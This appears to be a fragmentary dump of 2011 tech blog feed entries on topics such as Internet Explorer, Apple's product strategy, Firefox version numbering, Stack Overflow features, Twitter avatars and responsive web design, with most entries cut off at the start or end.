style=\"margin:20px 0\"><small>Now, I apologize for writing what seems to be a less-than-optimistic post. But truly, from the conversations I&#39;ve had with the IE team to everything  said publicly on the matter, this looks to be the impending reality. I&#39;d be happy to correct or amend this post with any facts that conflict with the picture I&#39;ve painted above.</small>\n<div>Macha <a href=\"http://blog.initprogram.com/2011/09/27/76-ies-not-likely/\">posted a thoughtful response</a> ruminating on what browsers will be most at-play for us in 5 years time. I like it,\n<p>It&#39;s also worth pointing out (thx James Pearce) that this post doesn&#39;t mention mobile. Are desktop browsers relevant in 5-10 years?</p>\n</div>\n<div>Sylvain Galineau, who works on the standards side of IE, indicates the document mode situation painted above is probably unlikely. I admit it seems preposterous. Perhaps I should have left the document mode aspect out of this post entirely.\n<p>Anyway, Sylvain says: <strong>&quot;Bottom line: I think all you have established is that things will probably not turn out that way.&quot;</strong> So that&#39;s good!  :)  Exchange here: <a href=\"javascript:void(0);\"><img src=\"javascript:void(0);\" alt=\"\" height=\"70\"></a></p>\n</div>"

      "content" : "<p>Another good book to recommend: <a href=\"http://endmalariaday.com/\">End Malaria</a>. </p>\n\n<p>This book is not about malaria. It is an anthology of advice about working smarter. The book's official name is <a href=\"http://www.amazon.com/End-Malaria-Michael-Bungay-Stanier/dp/1936719282\">End Malaria: Bold Innovation, Limitless Generosity, and the Opportunity to Save a Life</a>. $20 from every sale (including the Kindle version) will go to <a href=\"http://www.malarianomore.org/\">Malaria No More</a>, whose mission is to end malaria in Africa by 2015. </p>\n\n<p>In other words, buy a book and save a life. Your $20 portion of the proceeds go towards eradicating a horrible cascading disease than CAN be eradicated for the most part. The disease cascades because when someone is infected with malaria they lose energy and ambition and tend not to do the things that would prevent others from getting the disease, so the harm spirals on. The good news is that inexpensive things like mosquito bed nets can help prevent malaria, supplying energy to keep improving conditions and thus saving many lives over time. So ending malaria even for one person amplifies a virtuous circle. And if you buy a copy of this book you'll buy a bed net and help save some lives. Simple as that. Getting rid of malaria is something we have to do.</p>\n\n<p>I contributed an essay for the book called \"What you don't have to do.\"  It's a bit of advice that I've gained over the years about finding my role in the world. Maybe you'll find it useful too. There's scores of other essays by a lot of other interesting people and advice givers, from Dan Pink to Tom Peters.</p>\n\n<p>The book is only part of a campaign to end malaria. Many of the contributors, including me, made an audio recording, available for listening <a href=\"http://endmalariaday.com/webinar/\">here</a>.</p>\n\n<p><iframe width=\"480\" height=\"390\" src=\"http://www.youtube.com/embed/o73udN_Y3Z0\" frameborder=\"0\"></iframe></p>\n\n<p>But what about the actual book, published by the <a href=\"http://www.thedominoproject.com/\">Domino Project,</a> working for free? It's pretty good, full of hard-earned wisdom. My piece follows. If you like you'll like the book.</p>\n\n<p>***</p>\n\n<p><strong>WHAT YOU DON'T HAVE TO DO</strong></p>\n\n<p>When you start your first job, all your attention is focused on not screwing up. Your chief goal as a newbie is to simply do a good job. Working smart means doing what is required.</p>\n\n<p>As you gain confidence in your ability to complete a job, your task is to learn new things, to take on additional chores. At this stage, working smart meant doing more than is required.</p>\n\n<p>The next level is exploration. The greater number of additional tasks you try, the faster you begin to see what you are better at. Working smart means trying as many roles as you can in order to discover what you are smart at.</p>\n\n<p>As you educate yourself about your own talent and ambitions, you graduate from doing a task right to doing the right task. It takes some experience to realize that a lot of work is better left undone. It might be busy work that is performed out of habit, or it may work heading in the wrong direction. Working smart means making sure you are spending your time on jobs that are effective or that need to be done at all. </p>\n\n<p>But the smart journey doesn’t end there. If you really pay attention to the feedback of those around you, and constantly strive to improve, you may eventually be able to discover your own best talents. At this stage you can begin to do only jobs (that really need to be done) that you are good at doing. And what a joy that is! For many years I thought this was the pinnacle of working wisdom. What could be more heavenly than to spend your energies only on those tasks you were both good at AND loved?</p>\n\n<p>But recently it began to dawn on me that there is yet another stage beyond doing things well and with love.</p>\n\n<p>It began with my experience as an editor of magazines. A large part of the editor’s job is getting other people to complete stories based on ideas the editor (me) had. So I got used to handing over good ideas. But while I could assign most good ideas, every once in a while I’d get a great idea that I simply could not sell. So I’d let it die. But a few of those left to die would resurrect themselves so I would try again to give it away. Some got picked up but a few would simply get no assignment and retreat. A number of these ideas might go through this cycle a dozen times, until at the end I would face it: Here was an idea so good that I could not kill it, yet no one else wanted it. </p>\n\n<p>It took me several times to realize that this was a signal. It said, “This is the one you have to do.”  These stories woud become the best ones I ever wrote.</p>\n\n<p>That’s because they were the stories no one else could write. What I had been inadvertently doing was weeding out good ideas that I could do (but others could do as well) from those few great ideas that only I could do. I had discovered that it was not enough to be able to do something well, and want to do it, and to get paid for doing it. Work at its smartest means doing that work that no one else could do.</p>\n\n<p>That’s a pretty high bar. Becoming aware of what one can do well that others cannot is an immense challenge. In most cases, it takes our whole lives to discover this. This awareness arrives only through deliberate practice and with the help of others, but the payoff is equally immense. When you are doing something well that others want, and you are the only one who can do it, you will be uncommonly rewarded. </p>\n\n<p>This is true of the famously successful, but also of small-scale success as well. You can do bookkeeping, pizza delivery, pet grooming, goat dairy farming, chemistry research, and high school teaching with unique excellence. And yes, there is plenty of room in the world for everyone’s job to be a little different. The hardest part of this discovery is steering yourself away from imitating those who have already succeeded, in order to discover what your own excellence. </p>\n\n<p>I think my experience may offer one useful tip in this process. When others are doing something like you are, let that activity go because that means you don’t have to do it!  If they are stealing your ideas, ripping off your moves, knocking off your style, and they are doing it well, thank them. You’ve just learned that that assignment is something you don’t need to do because someone else can do it. This is scary because you are giving up things you do well, and you might think that after surrendering all the good stuff, there won’t be anything excellent left for you. Trust me, there is more to you than that.</p>\n\n<p>But it will take all you life to find it. All, as in all your days. And all, as in all your ceasless effort. Your greatest job is shedding what you don’t have to do. </p>\n\n<p>*** </p>\n\n<p>You can buy <a href=\"http://www.amazon.com/End-Malaria-Michael-Bungay-Stanier/dp/1936719282\">the book</a> on Amazon.</p><p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/hhtodjhmb4g922okahkj5r5k0c/468/60#http%3A%2F%2Fwww.kk.org%2Fthetechnium%2Farchives%2F2011%2F09%2Fwhat_you_dont_h.php\" width=\"100%\" height=\"60\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/thetechnium?a=PAvzDuT3Rc8:ZkUAwTfH4Gg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/thetechnium?d=yIl2AUoC8zA\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/thetechnium/~4/PAvzDuT3Rc8\" height=\"1\" width=\"1\">"

The options I\nget are just… meaningless. Yes, I want “Everyday Computing,” so\nI want an Inspiron. But hang on, I also want “Design &amp;\nPerformance,” so I want an XPS. Wait a second, I want “Thin &amp;\nPowerful,” too. So maybe I want a Z Series? But the only line that\napparently matches my broad search criteria — lightweight,\n11-14&quot; — I wouldn’t even consider because I don’t want a\n“gaming” laptop, and so I’m never going to click Alienware!</p>\n</blockquote>\n\n<p>From HP:</p>\n\n<blockquote>\n  <p>The same odd labels cover everything — I know I don’t want\n“Mini/Netbook,” but I want both “Everyday Computing” (that term\nagain) and “High performance” (because I don’t want it to be slow,\ndo I?). And who knows what “Envy” means? When I tick my screen\nsize and weight boxes, I get back a crop of lousy netbooks that\nare almost the complete opposite of what I want.</p>\n</blockquote>\n\n<p>And Lenovo:</p>\n\n<blockquote>\n  <p>It starts off with the same stupid classifications that must make\nsense to some guy in marketing — “Powered for productivity” and\n“Optimized for entertainment” and “No-nonsense features built for\nversatility”.</p>\n</blockquote>\n\n<p><a href=\"http://daringfireball.net/linked/2011/07/25/doctorow\">Here’s what I wrote back in July</a>, linking to Cory Doctorow’s review of the Samsung Galaxy Tab Some-Size-or-Another:</p>\n\n<blockquote>\n  <p>Cory Doctorow calls the new Samsung Galaxy Tab “meh”:</p>\n\n<blockquote>\n  <p>Ever since the iPad shipped, I’ve been waiting impatiently for a\ncomparable Android device to emerge — something of like shape,\nsize and capacity, but from a more open ecosystem than the one\nApple offers.</p>\n</blockquote>\n\n<p>I love these sort of reviews. <em>I want an Apple-quality product\nwithout the Apple, and I’m sure I’ll get one soon.</em></p>\n</blockquote>\n\n<p>And don’t forget the Apple-like prices, which is where Bright’s laptop hunt faltered. But so why the dearth of Apple-caliber products from companies other than Apple?</p>\n\n<p>Bright’s analysis regarding why the top PC makers seemingly — if not outright <a href=\"http://www.digitimes.com/news/a20110803PD214.html\">admittedly</a> — can’t compete with the MacBook Air strikes me as pretty good:</p>\n\n<blockquote>\n  <p>The problem is that the PC industry, particularly the large\nOEMs, just aren’t set up to produce this kind of machine. The\nPC industry is built around an idea of almost infinite\nvariation: different Wi-Fi adaptors, different Ethernet\nchipsets, different GPUs, different USB3 controllers. This\nvariety is then reflected in the systems available from\nmanufacturers — and more importantly, it’s reflected in the\nway the systems are actually built.</p>\n</blockquote>\n\n<p>Design is largely about making choices. The PC hardware market has historically focused on three factors: low prices, tech specs, and configurability. Configurability is another way of saying that you, the buyer, get a bigger say in the design of your computer. (Bright points out, for example, that Lenovo gives you the option of choosing which Wi-Fi adaptor goes into your laptop.) Apple offers far fewer configurations. Thus MacBooks are, to most minds, <em>subjectively</em> better-designed — but <em>objectively</em>, they’re <em>more</em> designed. Apple makes more of the choices than do PC makers.</p>\n\n<p>This isn’t new. And traditionally, the benefit from Apple’s lesser degree of configurability has been the “it just works” factor — better integration of software and hardware. That with support for fewer components, like, say video cards, the Mac OS needs fewer drivers, and the drivers it does have are less likely to result in unusual conflicts.</p>\n\n<p>But now that Apple’s products are more popular, we’re beginning to see another benefit to Apple’s lesser degree of configurability: greater scalability. Apple needs larger quantities of fewer different components to manufacture the same number of computers as other companies. It’s not just the economies of scale that all companies get when they sell 3 or 4 million laptops in a quarter — it’s greater, because Apple’s 3 or 4 million laptops sold share a larger number of the exact same components.</p>\n\n<p>This advantage is more pronounced with iOS devices. In four years, Apple has gone from not being in the phone business to reaping a majority of the handset industry’s worldwide profits. Yet they make only two phones — the iPhone 4 and 3GS.</p>\n\n<p>Likewise with the iPad. Your only choices:</p>\n\n<ul>\n<li>White or black</li>\n<li>GSM, CDMA, Wi-Fi-only</li>\n<li>16/32/64 GB of storage</li>\n</ul>\n\n<p>The iPad is the best-selling portable computer in the world and those are the only configurable options. One CPU, one display, one amount of RAM.</p>\n\n<p>The new MacBook Airs are iPad-like. I’ve called my 11-inch Air an “iPad Pro”, and the more I use it, the more that feels true.<sup><a href=\"http://daringfireball.net/#fn1-2011-09-09\">1</a></sup> Apple is selling more MacBooks than ever before, but their range of models <a href=\"http://www.macworld.com/article/161199/2011/07/apple_discontinues_macbook.html\">is shrinking</a>, not expanding. As SSD prices fall, I expect Apple to drop the “Air” and “Pro” distinctions and simply offer four Air-like MacBooks: 11, 13, 15, and 17 inches.</p>\n\n<p>So let’s be lazy for a second here, and attribute all of Apple’s success over the past 15 years to two men: Steve Jobs and Tim Cook. We’ll give Jobs the credit for the adjectives <em>beautiful</em>, <em>elegant</em>, <em>innovative</em>, and <em>fun</em>. We’ll give Cook the credit for the adjectives <em>affordable</em>, <em>reliable</em>, <em>available</em>, and <em>profitable</em>. Jobs designs them, Cook makes them and sells them.</p>\n\n<p>It’s the Jobs side of the equation that Apple’s rivals — phone, tablet, laptop, whatever — are able to copy. Thus the patents and the lawsuits. Design is copyable. But the Cook side of things — Apple’s economy of scale advantage — cannot be copied by any company with a complex product lineup. How could Dell, for example, possibly copy Apple’s operations when they currently classify “Design &amp; Performance” and “Thin &amp; Powerful” as separate laptop categories?</p>\n\n<p>This realization sort of snuck up on me. I’ve always been interested in Apple’s products because of their superior design; the business side of the company was never of as much interest. But at this point, it seems clear to me that however superior Apple’s design is, it’s their business and operations strength — the Cook side of the equation — that is furthest ahead of their competition, <em>and</em> the more sustainable advantage. It cannot be copied without going through the same sort of decade-long process that Apple went through.</p>\n\n<div>\n<hr>\n<ol>\n<li>\n<p>Which is not to say we won’t get a real iPad “pro” next year when the iPad expands into a family of two or even three devices, good/better- or good/better/best-style. <a href=\"http://daringfireball.net/#fnr1-2011-09-09\" title=\"Jump back to footnote 1 in the text.\">↩</a></p>\n</li>\n</ol>\n</div>"

Most web developers agree it’s good for HTML5 feature evolution but it’s not without problems:</p><ul><li>Add-on compatibility. Most of us use extensions which cannot keep up with Firefox’s development progress.</li><li>Increased effort. The majority of IT departments must test mission-critical applications before a browser update can be deployed throughout the enterprise.</li><li>Confusion. Few people understand the rationale behind major version increments. Why shouldn’t Firefox 6 be version 4.2?</li></ul><p>Mozilla is replicating Google’s release model but Chrome does not necessarily exhibit the same problems. It’s add-ons system is far simpler; more akin to bookmarklets than integrated code. The browser also has fewer legacy hurdles and has silently updated since the early days. Those using Chrome either understand this concept or don’t care.</p><p>One solution Mozilla considered was the <a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=678775\">removal of version numbers from Firefox’s “Help &gt; About” dialog</a>. Mozilla’s logic:</p><ol><li>Few users understand version numbers.</li><li>Removal would simplify the UI.</li><li>Users would be informed when the last check occurred, whether they were using the latest version, and how they could update (if Firefox had not automagically done so).</li><li>If you really needed the version number, it could be found in about:support.</li></ol><p>Uproar ensued on <a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=678775\">Bugzilla</a> and the <a href=\"http://groups.google.com/group/mozilla.dev.usability/browse_thread/thread/fe75ec92c02be934#\">associated newsgroup discussion</a>. The majority of respondents detested the idea <em>(although a large volume of ranting and spam appeared when Mozilla’s intentions went public)</em>.</p><p>The organization put forward some reasonable arguments but ultimately backed down. Mozilla’s Robert Kaiser:</p><blockquote><p> Can we close this bug report?</p><p>Version numbers in software are like coordinate systems in physics: irrelevant and necessary at the same time — it’s completely irrelevant how you do them, but they provide necessary reference points. Not more, not less.</p><p>Where ever we go with this, I don’t think it will have either a large impact on version number messaging or on making Firefox useless, so I think the rage on both sides is overrated.</p></blockquote><p>The reply from VanillaMozilla:</p><blockquote><p> Done … I’m having a hard time finding anyone at all who thinks this is a good idea.</p></blockquote><p>The argument become overheated but Mozilla’s proposition had a number of flaws:</p><ol><li>It went against established UI conventions that span OSes and 20+ years of IT development. There may be better ways, but removing version numbers is not likely to be the best solution.</li><li>The proposal was too simplistic and did nothing to tackle Firefox’s rapid update issues. Version numbering was never the cause or the cure.</li><li>Users may not understand version numbers, but removing them was a non-issue. Firefox wouldn’t suddenly become easier to use.</li><li>There are multiple versions of Firefox in the wild. Some would have version numbers, some wouldn’t. None of the older editions would state they were out of date.</li><li>Version numbers are important to developers and IT support staff. What’s the first question you ask when someone reports a problem in a specific browser?</li></ol><p>Version numbers have been rendered meaningless in Chrome and Firefox. Few people know or care what version of Chrome they’re running. Perhaps, one day, the same will be true for Firefox — but we’re not there yet.</p><p>Firefox is an older browser with far more baggage and a large, passionate user community. Mozilla ultimately listened to their demands, but the the proposal and subsequent onslaught did nothing for the browser.</p><div><div>  </div><div>  </div></div><div style=\"clear:both\"></div>"

That’s right, any internet community ultimately succeeds or fails on the strength and quality of its contributors. Shocking, I know!</p>\n<p>But while recording <a href=\"http://blog.stackoverflow.com/2011/08/se-podcast-15/\">podcast #15</a> with <a href=\"http://cooking.stackexchange.com/users/1393/michael-at-herbivoracious\">Michael Natkin</a> of <a href=\"http://cooking.stackexchange.com\">cooking.stackexchange.com</a>, I belatedly realized we weren’t making it <i>easy</i> to discover  information about the smart people answering all those questions. Sure, we show the basics (reputation, name, badges) in the default User Card that every post is “signed” with — but that gives you the barest of context into the person answering, or their professional background in the topic.</p>\n<p>To rectify that, we now have improved User Cards that <b>expand when you hover over the avatar</b>, displaying location, key links, and an excerpt of the “About Me” field:</p>\n<p><img src=\"http://blog.stackoverflow.com/wp-content/uploads/user-card-hover-expansion.png\" alt=\"\" title=\"user-card-hover-expansion\" width=\"534\" height=\"213\"></p>\n<p>So now you can quickly discover a bit more about the human being who wrote that post — without needing to click all the way through to their user page.</p>\n<p>On Stack Exchange, Q&amp;A is designed to focus squarely on the content of the questions and answers, not necessarily the <i>person</i>. That said, it is sometimes useful to learn a little but more about the author to provide more context for the post. As one (admittedly extreme) example, off-topic questions are strictly forbidden, but <a href=\"http://blog.stackoverflow.com/2009/01/welcome-our-newest-member-alan-kay/\">we might be willing to stretch the rules a bit if you’re Alan <i>freaking</i> Kay</a>.</p>\n<p>As it turns out, many of our community members are rather interesting people, even outside that particular Q&amp;A topic. Hovering over an avatar lets you easily learn a bit more about your fellow community members … if you want to.</p>\n<p><a href=\"http://cooking.stackexchange.com/users\"><img src=\"http://blog.stackoverflow.com/wp-content/uploads/user-card-hover-user-page-cooking.png\" alt=\"\" title=\"user-card-hover-user-page-cooking\" width=\"480\" height=\"303\"></a></p>\n<p>We treat the expanding user card as a bit of a privilege, so <span style=\"background-color:#fffbcc\">you must have 1,000 or more reputation for it to appear</span>. Any user with less than 1k rep will not have a user card hover by definition. And, of course, there has to be a reasonably complete user profile, otherwise there’s nothing to show! </p>\n<p>There are some other subtle ways we try to keep this user card hover useful, such as prioritizing any “identity” links like Twitter, Facebook, Linked In, Google+, etcetera — and you can override the excerpt for total control of what displays on your expanded User Card. <a href=\"http://meta.stackoverflow.com/questions/104810/how-does-the-user-card-popup-work\">See our meta post</a> for more detail.</p>\n<p>This is all completely optional, of course, so to distinguish between the two states, we’ve added <b>a subtle 3D shadow to the avatars that have an expanding user card on hover</b>. So if you’d like to share a bit more about your background with your peers, and provide a bit of additional author context to your questions and answers, don’t hesitate to flesh out your profile!</p>"

So we came up with a solution that provides the best of both worlds.  We can now create a mini-site by selecting relevant tags (in this case, anything Facebook related) and grouping together just the content from those tags. When you visit a mini-site, you’ll see <i>only</i> the content from those tags.  Not only will you be able to see only questions related to Facebook, but the reputation on the user ranking pages will also only show reputation earned on questions tagged Facebook.</p>\n<p><a href=\"http://facebook.stackoverflow.com/users\"><img title=\"fb-rep\" src=\"http://blog.stackoverflow.com/wp-content/uploads/fb-rep.png\" alt=\"\" width=\"431\" height=\"223\"></a></p>\n<p>The key to this functionality is that you’re seeing a filtered view of Stack Overflow, much like if you set up a favorite tags view. That means that when you ask a question on Facebook.SO, you’re still getting access to the entire community of 750,000+ users, and any questions you answer there count toward your Stack Overflow reputation, too.</p>\n<p>If you’re a Facebook developer who is already a Stack Overflow user, we’ve made it incredibly easy to get started.  In fact, you don’t have to do anything at all (though you do want to make sure your Facebook account is connected to your SO account — there’s instructions how on the <a href=\"https://developers.facebook.com/blog/post/545/\">Facebook Developer Blog</a>).  If you’re a Facebook Developer who <i>doesn’t</i> already have a Stack Overflow account, just visit <a href=\"http://facebook.stackoverflow.com\">facebook.stackoverflow.com</a> and click the Facebook “Log In” button on the right hand side. You’ll be up and running in about 10 seconds.</p>\n<p>Enjoy!</p>\n<hr>\n<p>If you want to learn even more about what you can do with Facebook and other new technologies, make sure to register for our upcoming <a href=\"http://devdays.stackoverflow.com\">Stack Overflow DevDays</a> conference series, coming up this fall.</p>\n<p><a href=\"http://devdays.stackoverflow.com\"><img title=\"DevDays Blog Ad\" src=\"http://blog.stackoverflow.com/wp-content/uploads/blog-banner.png\" alt=\"\" width=\"600\" height=\"175\"></a></p>"

      "content" : "<p>I joined twitter around early 2007 and during those early months I toyed with a number of different avatars. At some point I settled on the avatar I have now – just a quick snap of me in front of my desktop.</p>\n\n<p>However, as the years went on, I got chubbier, I usually sport a light beard and I have longer hair. When people meet me in reality they quickly realise I don’t look like my avatar. </p>\n\n<p>So I changed it and it worked badly against me.\n<span></span></p>\n\n<p><small><em>Disclaimer:</em> sorry folks, this is a very <em>me</em> post, I’m not mad on them – but really it’s here because I’ll forget in another 3 years, and this post will be a reminder of why I don’t change my mugshot too often!</small></p>\n\n<p>I’ve tweeted around 14,000 messages. That’s not to say it’s alot, but people following me have a certain unspoken agreement with me: I’ll tweet about tech and a few personal things, and they’ll recognise me as the guy in the white tee.</p>\n\n<p>It doesn’t really matter what my avatar looks like, but what I had done, without realising, is create a brand around my own name, and my brand image was my avatar. This is marketing 101 to most people, but I’m <em>just</em> a developer, and I wanted to update my avatar to represent myself a little more honestly.</p>\n\n<p>It’s like salt &amp; vinegar vs. cheese &amp; onion. Walkers, some time ago, used to have salt &amp; vinegar in blue packets and cheese &amp; onion in green. Some point along my life they swapped the colours. Ever since I’d always grab the wrong packet if I didn’t carefully read the packaging.</p>\n\n<p><img style=\"float:right;max-width:30%;padding:18px;padding-top:0\" src=\"http://remysharp.com/images/remysharp-2011.jpg\">By changing my avatar to what is mostly white, pink and black, to a mostly dark colours, when I tweeted announcing my new workshop tour project, I couldn’t work out why the reception was so poor. Then I realised: most folks didn’t spot my tweet because it came from a brand they didn’t recognise. My tweet was filtered out as noise via the native RT in twitter because folks didn’t recognise me – rightly so.</p>\n\n<p>So I changed it back within 24 hours of changing my avatar.</p>\n\n<p>The lesson here is that, even without knowing it, nor actively trying to do it, we’re creating a brand, and on twitter our brand is our avatar. That doesn’t mean you can’t change it – I’ve heard of some people who constantly change their avatar, but <em>that’s</em> their brand – it just means if you use twitter for both personal and business, just be careful to maintain a consistent appearance.</p>\n\n<p style=\"margin-top:16px;border-top:2px solid #ccc;padding-top:18px\">Almost 6 months later, I’ve tried again, this time I’m going to try to stick to it. I’ve purposely tried to keep the position of my head and the shapes in the image the same as the previous image, but it’s not easy – old face just ain’t the new thing it used to be!</p>\n\n<div style=\"width:100%;overflow:hidden\">\n<img style=\"max-width:50%;float:left;display:block\" src=\"http://remysharp.com/images/rem-2008.jpg\" alt=\"Remy 2008\" title=\"Remy 2008\">\n<img style=\"max-width:50%;float:left;display:block\" src=\"http://remysharp.com/images/rem-2011.jpg\" alt=\"Remy 2011\" title=\"Remy 2011\">\n</div>\n\n\n<p>Related posts:<ol><li><a href=\"http://remysharp.com/2009/06/02/twivatar-a-twitter-avatar-api/\" rel=\"bookmark\" title=\"Permanent Link: Twivatar, a Twitter avatar API\">Twivatar, a Twitter avatar API</a></li></ol></p><div>\n<a href=\"http://feeds.feedburner.com/~ff/remysharp?a=L4x2lvQFPe0:j7eKlULZxNM:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/remysharp?i=L4x2lvQFPe0:j7eKlULZxNM:F7zBnMyn0Lo\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/remysharp/~4/L4x2lvQFPe0\" height=\"1\" width=\"1\">"

Along with this comes an explosion of opportunity: opportunity for individuals to stand out, for new products to emerge and for entrenched companies to be replaced. Now is such a time in the web community.</p><p>For as long as I can remember, the primary focus in web development has been on ensuring that websites render the same across all browsers. We took great effort to ensure that a client’s website looked exactly the same in everything from old versions of Internet Explorer to the latest Firefox, all at once.</p><p>In the past few years, we have witnessed growing interest in what is known as progressive enhancement, which is the technique of serving advanced features and styles to modern browsers but not to older unsupported browsers.</p><p>This approach never seemed to settle in across the board. Most agencies still strive to make their websites universal. And progressive enhancement was often regarded as an excuse to ignore annoying problems. As it turns out, web people are rather crafty and have created tools that overcome countless browser problems.<span></span></p><p>Some of these developments have led to the notion of “responsive web design.” If you are not familiar with the term, be sure to check out the <a href=\"http://www.alistapart.com/articles/responsive-web-design/\">definitive introduction to it on A List Apart</a>.</p><p>To sum it up quickly, the gist is that you customize a page’s rendering to suit the user’s device. For a while, this was easy to do: if the user was on a mobile device, they were redirected to a separate mini-site. But with smartphones and especially tablets, the line has blurred.</p><p>Responsive design has quickly become recognized as an incredibly smart way to build websites. How far you take it is up to you. But one thing is for sure: it is radically changing the industry and is affecting countless practices and tools that we have used for years. Let’s consider the impact of this new approach on some of the basic tools we have come to rely on and on web design in general.</p><p><br></p><h1>Raising the bar</h1><p>Almost everyone working on the web has at some point been faced with someone who believes their friend’s teenager could handle their project. This perspective has always been annoying, but there is some light at the end of the tunnel. With responsive design, things just got a lot more complicated. There is now a tremendous opportunity for web professionals to stand out from the herd.</p><p>There are thousands of web designers and developers around the world, and we are all connected by the magical medium we work in. This is both great and problematic. Given the number of people available for work, standing out can be hard.</p><h2>The opportunity</h2><p>There is actually a fabulous opportunity here. If you’re aggressive enough, you could stand out by working your tail off to quickly grasp responsive design and development. Dig in and learn it, update your personal website, and talk about your results. I guarantee if you put up a fresh portfolio that demonstrates this skill set, people will be interested in working with you. But the window for this is fairly short, depending on how quickly other designers get on board.</p><p><br></p><h1>Budgets</h1><p>Budgets pose a significant hurdle with this approach. With responsive design, we have to create as many as four variations for every layout, to target smartphones, tablets, netbooks and desktops. Consider a basic website with only two pages: a home page and an inner page. Those two layouts become eight variations when you implement them for four device sizes.</p><p>Does this mean we should charge four times as much for the work? That hardly seems likely. Obviously, the costs will be incremental, but the time required to prepare the layouts and code them to function properly will definitely increase.</p><p>Client education will play a huge role. We have to help our clients understand that while iPads and iPhones are cool, those devices are driving up the cost of quality development. Getting clients to understand our costs is tough enough as it is.</p><h2>The opportunity</h2><p>If you want to make a splash in the community, create a tool that addresses budget issues. Many have already done so, with tools like <a href=\"http://stuffandnonsense.co.uk/projects/320andup/\">320 and up</a> and the <a href=\"http://lessframework.com/\">Less Framework</a>. Both of these reduce the time it takes to build products, and they help developers trim time off of budgets. 320 and up in particular is a perfect example of how to capitalize on this opportunity.</p><p>With the field wide open now, introducing tools to the marketplace that streamline the development process in support of responsive design will be much easier. We could even create tools that replicate existing ones but that are oriented around responsive design.</p><p><br></p><h1>JavaScript libraries and their plug-ins</h1><p>One of the many areas that could get turned upside down is the market for plug-ins that work with popular frameworks such as jQuery. The market is stuffed with gorgeous plug-ins that do a vast array of things in the browser: slideshows, photo galleries, forms, pop-ups, the list goes on.</p><h2>The opportunity</h2><p>The opportunity here is insane. Take a common plug-in, such as the slick slideshow tool <a href=\"http://nivo.dev7studios.com/wordpress/\">Nivo Slider</a>. This awesome tool is in countless developers’ tool belts. The market is ripe for someone to create a similar tool that self-adjusts to function smoothly across devices using a responsive approach.</p><p>The same goes for almost any plug-in. If you’re looking for a project that virtually guarantees success, choose a hot plug-in, and create a responsive version that adapts to function properly on different devices.</p><p><br></p><h1>Browser testing</h1><p>While this article is more about the development process, let’s consider browser testing. This is a basic part of building websites. Anyone knee-deep in building a website is likely testing stuff in multiple browsers as they go. And at some point, most websites undergo an in-depth test in numerous browsers.</p><p>But how do we tackle this through responsive design? Should the team own all of the most popular devices? Sure, there are emulators, but most are painful to install and work with. And nothing beats testing with the real thing.</p><h2>The opportunity</h2><p>Setting up software on computers to take screenshots on a variety of browsers and platforms is kind of hard. But setting up systems to automatically capture screenshots from the ever-increasing number of devices is <em>really</em> hard. The solutions that do exist are expensive, and I have yet to find a good service for this.</p><p>This is one of those situations where complexity is an advantage. If someone manages to skin this cat, then it would be rather hard for others to follow. There are many solutions for taking automated screenshots in multiple browsers, but the first person to offer screenshots for devices will have something quite unique to sell. And the community will respond in a big way.</p><p><br></p><h1>Templates and themes</h1><p>The market for ready-to-go themes is huge, but responsive design is a monkey wrench here, too. Template providers won’t likely retrofit their designs to accommodate these new requirements. Rather, they will probably add responsive features to future releases. And therein lies the opportunity.</p><h2>The opportunity</h2><p>Old templates have not been rendered useless; they are just missing an important component. This levels the playing field for a while. If you’ve been considering jumpstarting your own theme business, this is a great time to do so. Established companies will have to support their legacy templates, and while they enjoy some advantages, the barrier to entry in the market just got a bit lower.</p><p><br></p><h1>Software services</h1><p>The community has come to rely on software services for things like wireframing and usability testing. But how do these tools handle multiple devices? Many tools address, say, usability testing, and some new ones even address mobile testing (such as <a href=\"http://mobile.youeye.com/\">YouEye Mobile</a>), but they solve only part of the problem.</p><p>In the wireframing niche, there is a common way to handle various page layouts, but I have yet to find a solution that handles a single page layout for various devices. The need is so simple, yet many systems simply break down. Should we create a new wireframe for each device? The answer is not clear.</p><h2>The opportunity</h2><p>The market is ripe for tools that support people’s current approaches to working online, while embracing responsive design. You might be able to lure customers away from competitors by offering features that embrace these modern techniques.</p><p><br></p><h1>Conclusion</h1><p>Change can be unnerving, even overwhelming. No matter how much you learn, you always feel like you’re lagging behind. But everyone is in the same boat. In times of great change, you can maximize opportunity by diving in and riding the first wave.</p><p><br></p><p><em>Written exclusive for WDD by <a href=\"http://pmcneil.com\">Patrick McNeil</a>,  a freelance writer, developer and designer.

Thus, gaining a respectful reputation in SO is practically impossible these days. Which gives an unfair advantage to veteran SO users.</p></blockquote>\n<p>First of all, whoa… have you seen the Stack Overflow homepage lately? We’re getting about 4,000—<em>four thousand!</em>—questions a day. There are puh-LENTY of opportunities to find a question to answer.</p>\n<p>But more importantly, sheer reputation scores are not how Careers 2.0 works, and it’s not what Careers 2.0 hiring managers are looking for. What they want to see is a sample of your work. They don’t need to see your answers to 7000 questions—they want to see five really good ones.</p>\n<p>A Careers 2.0 profile is designed to let you highlight your best software development work. You can <a href=\"http://blog.stackoverflow.com/2011/06/codeplex-and-other-gateway-drugs/\">link to open source projects</a>, <a href=\"http://blog.stackoverflow.com/2011/04/a-bookshelf-on-your-careers-2-0-profile/\">link to your favorite books</a>, link to your blog posts, but most importantly, you can pick some of your favorite answers that you wrote on Stack Overflow and link to them. Four or five great answers is enough to prove to a recruiter that you know your stuff. (Here’s <a href=\"http://careers.stackoverflow.com/spolsky\">what my profile looks like</a>. I’m not actually on the job market; please don’t try to hire me!)</p>\n<p>If you want to build up a decent Careers 2.0 profile without spending hours a day, I recommend looking for five unanswered questions and just overkilling the answers. There are LOTS of easy questions on Stack Overflow. They tend to drive me crazy; many of them are “do my work for me” type questions. If we had a dollar for every time someone asked how to “replace a bunch of strings in a bunch of files with another bunch of strings, in Python” we wouldn’t have had to raise $18M in venture capital. There are <em>hundreds</em> of questions on Stack Overflow about how to replace strings. Some of them have good answers and some have bad answers but you know what I really want to see? A single, amazing, awesome, EPIC answer that kills this topic so well that it becomes the standard source on the Internet of how to write code that replaces strings. It might start with an exploration of how to use <tt>sed</tt> and goes into Knuth-like detail on searching strings efficiently. Make your answer so amazing that it 